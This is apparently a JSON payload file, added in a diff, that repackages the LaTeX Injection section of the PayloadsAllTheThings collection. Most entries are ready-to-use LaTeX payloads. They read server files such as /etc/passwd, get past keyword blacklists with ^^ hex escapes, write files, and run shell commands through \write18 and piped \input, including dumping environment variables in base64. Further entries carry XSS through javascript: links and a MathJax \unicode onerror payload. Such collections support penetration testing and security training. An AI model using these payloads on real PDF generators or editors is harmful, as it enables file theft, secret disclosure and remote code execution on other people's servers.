@@ -1,0 +1,128 @@
+{
+  "category": "LaTeX Injection",
+  "source": "PayloadsAllTheThings/LaTeX Injection/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "Where LaTeX injection occurs",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "LaTeX is used for document preparation and typesetting — especially in academia, for scientific and mathematical documents.\n\nThe injection arises wherever user input ends up in a LaTeX document that is then compiled on the server (generating a PDF from LaTeX):\n• online formula and LaTeX document editors;\n• PDF generators — reports, invoices, diplomas, resumes, certificates;\n• fields rendered into the final PDF (name, title, signature, comment).\n\nThanks to LaTeX's powerful scripting capabilities, it allows reading/writing files and executing commands if the compilation is not sandboxed."
+    },
+    {
+      "subcategory": "File reading",
+      "title": "Reading a file with LaTeX interpretation (\\input, \\include)",
+      "language": "latex",
+      "tags": ["file-read", "input", "include"],
+      "body": "\\input{/etc/passwd}\n\\include{somefile} # load .tex file (somefile.tex)",
+      "meta": {
+        "tip": "\\input substitutes and interprets the file contents. \\include loads a .tex file (for somefile, somefile.tex will be loaded)."
+      }
+    },
+    {
+      "subcategory": "File reading",
+      "title": "Reading a single-line file (\\openin / \\read)",
+      "language": "latex",
+      "tags": ["file-read", "openin"],
+      "body": "\\newread\\file\n\\openin\\file=/etc/issue\n\\read\\file to\\line\n\\text{\\line}\n\\closein\\file"
+    },
+    {
+      "subcategory": "File reading",
+      "title": "Reading a multi-line file (\\lstinputlisting, \\read loop)",
+      "language": "latex",
+      "tags": ["file-read", "lstinputlisting", "loop"],
+      "body": "\\lstinputlisting{/etc/passwd}\n\\newread\\file\n\\openin\\file=/etc/passwd\n\\loop\\unless\\ifeof\\file\n    \\read\\file to\\fileline\n    \\text{\\fileline}\n\\repeat\n\\closein\\file"
+    },
+    {
+      "subcategory": "File reading",
+      "title": "Reading a file without interpretation (\\verbatiminput)",
+      "language": "latex",
+      "tags": ["file-read", "verbatim"],
+      "body": "\\usepackage{verbatim}\n\\verbatiminput{/etc/passwd}",
+      "meta": {
+        "tip": "Inserts the raw file contents as-is, without interpreting LaTeX special characters."
+      }
+    },
+    {
+      "subcategory": "File reading",
+      "title": "Deactivating special characters via \\catcode (for files with $ # _ &)",
+      "language": "latex",
+      "tags": ["file-read", "catcode", "bypass"],
+      "body": "\\catcode `\\$=12\n\\catcode `\\#=12\n\\catcode `\\_=12\n\\catcode `\\&=12\n\\input{path_to_script.pl}",
+      "meta": {
+        "tip": "If the injection point is after the document header (\\usepackage cannot be used), some control characters can be deactivated to apply \\input to a file containing $, #, _, &, null bytes, etc. (for example, perl scripts)."
+      }
+    },
+    {
+      "subcategory": "Bypass",
+      "title": "Blacklist bypass via unicode hex (^^)",
+      "language": "latex",
+      "tags": ["bypass", "blacklist", "unicode"],
+      "body": "\\lstin^^70utlisting{/etc/passwd}",
+      "meta": {
+        "tip": "To bypass a blacklist, replace one character with its unicode hex value.\n• ^^41 — uppercase A\n• ^^7e — tilde (~); note that 'e' must be lowercase.\nIn the example ^^70 = 'p', so \\lstin^^70utlisting -> \\lstinputlisting."
+      }
+    },
+    {
+      "subcategory": "File writing",
+      "title": "Writing a single-line file (\\openout / \\write)",
+      "language": "latex",
+      "tags": ["file-write", "openout", "write"],
+      "body": "\\newwrite\\outfile\n\\openout\\outfile=cmd.tex\n\\write\\outfile{Hello-world}\n\\write\\outfile{Line 2}\n\\write\\outfile{I like trains}\n\\closeout\\outfile"
+    },
+    {
+      "subcategory": "RCE",
+      "title": "Executing a command via \\write18 + reading the output",
+      "language": "latex",
+      "tags": ["rce", "write18", "command-execution"],
+      "body": "\\immediate\\write18{id > output}\n\\input{output}",
+      "meta": {
+        "tip": "The command output goes to stdout, so the result must be saved to a temporary file and then read via \\input. Requires compilation with shell-escape enabled (\\write18)."
+      }
+    },
+    {
+      "subcategory": "RCE",
+      "title": "RCE via base64 (bypassing bad characters)",
+      "language": "latex",
+      "tags": ["rce", "write18", "base64", "bypass"],
+      "body": "\\immediate\\write18{env | base64 > test.tex}\n\\input{text.tex}",
+      "meta": {
+        "tip": "If you get a LaTeX error, wrap the result in base64 to get rid of the bad characters (or use \\verbatiminput)."
+      }
+    },
+    {
+      "subcategory": "RCE",
+      "title": "RCE via a pipe into \\input",
+      "language": "latex",
+      "tags": ["rce", "input", "pipe", "command-execution"],
+      "body": "\\input|ls|base64\n\\input{|\"/bin/hostname\"}"
+    },
+    {
+      "subcategory": "XSS",
+      "title": "XSS via \\url and \\href (javascript:)",
+      "language": "latex",
+      "tags": ["xss", "url", "href"],
+      "body": "\\url{javascript:alert(1)}\n\\href{javascript:alert(1)}{placeholder}",
+      "meta": {
+        "tip": "From @EdOverflow. Triggers when the LaTeX link ends up in an HTML/PDF viewer that executes javascript:."
+      }
+    },
+    {
+      "subcategory": "XSS",
+      "title": "XSS in MathJax via \\unicode",
+      "language": "latex",
+      "tags": ["xss", "mathjax", "unicode"],
+      "body": "\\unicode{<img src=1 onerror=\"<ARBITRARY_JS_CODE>\">}",
+      "meta": {
+        "tip": "Works in MathJax (the unicode extension). Substitute your own JS for <ARBITRARY_JS_CODE>."
+      }
+    },
+    {
+      "subcategory": "Labs and resources",
+      "title": "Training labs and materials",
+      "language": "text",
+      "tags": ["labs", "references"],
+      "body": "Labs:\n• Root Me — LaTeX - Input: https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input\n• Root Me — LaTeX - Command Execution: https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution\n\nArticles:\n• Hacking with LaTeX — Sebastian Neef\n• Latex to RCE, Private Bug Bounty Program — Yasho\n• Pwning coworkers thanks to LaTeX — scumjr"
+    }
+  ]
+}
